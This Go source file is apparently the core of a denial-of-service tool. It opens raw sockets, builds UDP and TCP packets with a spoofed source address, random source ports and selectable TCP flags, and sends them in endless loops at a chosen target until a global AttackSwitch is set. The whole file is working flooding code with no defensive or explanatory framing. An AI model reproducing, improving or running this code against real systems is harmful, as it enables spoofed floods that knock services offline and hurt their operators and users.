package lib

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var AttackSwitch bool

func rawSocket(proto int) net.PacketConn {
	sock, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, proto)
	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	conn, _ := net.FilePacketConn(os.NewFile(uintptr(sock), fmt.Sprint(sock)))
	return conn
}

func setupOpt() (gopacket.SerializeBuffer, *gopacket.SerializeOptions) {
	buffer := gopacket.NewSerializeBuffer()
	opts := &gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	return buffer, opts
}

func convInt(str string) int {
	conv, _ := strconv.Atoi(fmt.Sprint(str))
	return conv
}

func (d *DDoS) setupUDP(src, dst *net.UDPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	ipv4 := &layers.IPv4{
		SrcIP:    src.IP.To4(),
		DstIP:    dst.IP.To4(),
		Version:  4,
		TTL:      255,
		Protocol: layers.IPProtocolUDP,
	}
	udpLayers := &layers.UDP{
		SrcPort: layers.UDPPort(src.Port),
		DstPort: layers.UDPPort(dst.Port),
	}
	udpLayers.SetNetworkLayerForChecksum(ipv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, ipv4, udpLayers, gopacket.Payload(d.ddosPayload))
	return sBuffer.Bytes()
}

func (d *DDoS) setupTCP(src, dst *net.TCPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	ipv4 := &layers.IPv4{
		SrcIP:    src.IP.To4(),
		DstIP:    dst.IP.To4(),
		Version:  4,
		TTL:      255,
		Protocol: layers.IPProtocolTCP,
	}
	tcpLayers := &layers.TCP{
		SrcPort: layers.TCPPort(src.Port),
		DstPort: layers.TCPPort(dst.Port),
		SYN:     d.synFlag,
		ACK:     d.ackFlag,
		RST:     d.rstFlag,
		PSH:     d.pshFlag,
		FIN:     d.finFlag,
		URG:     d.urgFlag,
	}
	tcpLayers.SetNetworkLayerForChecksum(ipv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, ipv4, tcpLayers, gopacket.Payload(d.ddosPayload))
	return sBuffer.Bytes()
}

func (d *DDoS) udpPacket() {
	dst := &net.UDPAddr{
		IP:   net.ParseIP(d.dstAddr),
		Port: convInt(d.dstPort),
	}
	conn := rawSocket(syscall.IPPROTO_UDP)
	for {
		udp := d.setupUDP(&net.UDPAddr{IP: net.ParseIP(d.srcAddr), Port: rand.Intn(65535)}, dst)
		conn.WriteTo(udp, &net.IPAddr{IP: dst.IP})
		if AttackSwitch {
			break
		}
	}
}

func (d *DDoS) tcpPacket() {
	dst := &net.TCPAddr{
		IP:   net.ParseIP(d.dstAddr),
		Port: convInt(d.dstPort),
	}
	conn := rawSocket(syscall.IPPROTO_TCP)
	for {
		tcp := d.setupTCP(&net.TCPAddr{IP: net.ParseIP(d.srcAddr), Port: rand.Intn(65535)}, dst)
		conn.WriteTo(tcp, &net.IPAddr{IP: dst.IP})
		if AttackSwitch {
			break
		}
	}
}
